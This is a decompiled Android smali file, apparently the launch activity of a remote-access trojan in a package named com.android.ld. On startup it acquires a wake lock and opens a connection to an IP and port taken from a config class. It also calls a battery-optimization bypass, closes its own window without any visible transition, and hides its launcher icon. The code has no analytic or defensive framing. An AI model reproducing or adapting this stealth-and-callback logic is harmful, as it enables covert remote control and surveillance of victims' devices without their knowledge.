.class public Lcom/android/ld/MainActivity;
.super Landroidx/appcompat/app/AppCompatActivity;
.source "MainActivity.java"


# static fields
.field static TAG:Ljava/lang/String;


# instance fields
.field activity:Landroid/app/Activity;

.field context:Landroid/content/Context;

.field private mWakeLock:Landroid/os/PowerManager$WakeLock;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 18
    const-string v0, "Main_Activity_Class"

    sput-object v0, Lcom/android/ld/MainActivity;->TAG:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .line 15
    invoke-direct {p0}, Landroidx/appcompat/app/AppCompatActivity;-><init>()V

    .line 16
    iput-object p0, p0, Lcom/android/ld/MainActivity;->activity:Landroid/app/Activity;

    .line 19
    const/4 v0, 0x0

    iput-object v0, p0, Lcom/android/ld/MainActivity;->mWakeLock:Landroid/os/PowerManager$WakeLock;

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 6
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .line 24
    invoke-super {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V

    .line 25
    const/4 v0, 0x0

    invoke-virtual {p0, v0, v0}, Lcom/android/ld/MainActivity;->overridePendingTransition(II)V

    .line 27
    invoke-virtual {p0}, Lcom/android/ld/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    iput-object v1, p0, Lcom/android/ld/MainActivity;->context:Landroid/content/Context;

    .line 28
    sget-object v1, Lcom/android/ld/MainActivity;->TAG:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Lcom/android/ld/config;->IP:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "\t"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v3, Lcom/android/ld/config;->port:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 29
    const-string v1, "power"

    invoke-virtual {p0, v1}, Lcom/android/ld/MainActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/os/PowerManager;

    .line 30
    .local v1, "pm":Landroid/os/PowerManager;
    sget-object v2, Lcom/android/ld/MainActivity;->TAG:Ljava/lang/String;

    const/4 v3, 0x6

    invoke-virtual {v1, v3, v2}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v2

    iput-object v2, p0, Lcom/android/ld/MainActivity;->mWakeLock:Landroid/os/PowerManager$WakeLock;

    .line 31
    invoke-virtual {v2}, Landroid/os/PowerManager$WakeLock;->acquire()V

    .line 32
    new-instance v2, Lcom/android/ld/connection;

    iget-object v3, p0, Lcom/android/ld/MainActivity;->activity:Landroid/app/Activity;

    iget-object v4, p0, Lcom/android/ld/MainActivity;->context:Landroid/content/Context;

    invoke-direct {v2, v3, v4}, Lcom/android/ld/connection;-><init>(Landroid/app/Activity;Landroid/content/Context;)V

    const/4 v3, 0x2

    new-array v3, v3, [Ljava/lang/String;

    sget-object v4, Lcom/android/ld/config;->IP:Ljava/lang/String;

    aput-object v4, v3, v0

    sget-object v4, Lcom/android/ld/config;->port:Ljava/lang/String;

    const/4 v5, 0x1

    aput-object v4, v3, v5

    invoke-virtual {v2, v3}, Lcom/android/ld/connection;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 33
    new-instance v2, Lcom/android/ld/battOp;

    iget-object v3, p0, Lcom/android/ld/MainActivity;->activity:Landroid/app/Activity;

    invoke-direct {v2, v3}, Lcom/android/ld/battOp;-><init>(Landroid/app/Activity;)V

    iget-object v3, p0, Lcom/android/ld/MainActivity;->context:Landroid/content/Context;

    invoke-virtual {v2, v3}, Lcom/android/ld/battOp;->Optimization(Landroid/content/Context;)V

    .line 34
    invoke-virtual {p0}, Lcom/android/ld/MainActivity;->finish()V

    .line 35
    invoke-virtual {p0, v0, v0}, Lcom/android/ld/MainActivity;->overridePendingTransition(II)V

    .line 36
    new-instance v0, Lcom/android/ld/functions;

    iget-object v2, p0, Lcom/android/ld/MainActivity;->activity:Landroid/app/Activity;

    invoke-direct {v0, v2}, Lcom/android/ld/functions;-><init>(Landroid/app/Activity;)V

    iget-object v2, p0, Lcom/android/ld/MainActivity;->context:Landroid/content/Context;

    invoke-virtual {v0, v2}, Lcom/android/ld/functions;->hideAppIcon(Landroid/content/Context;)V

    .line 37
    return-void
.end method
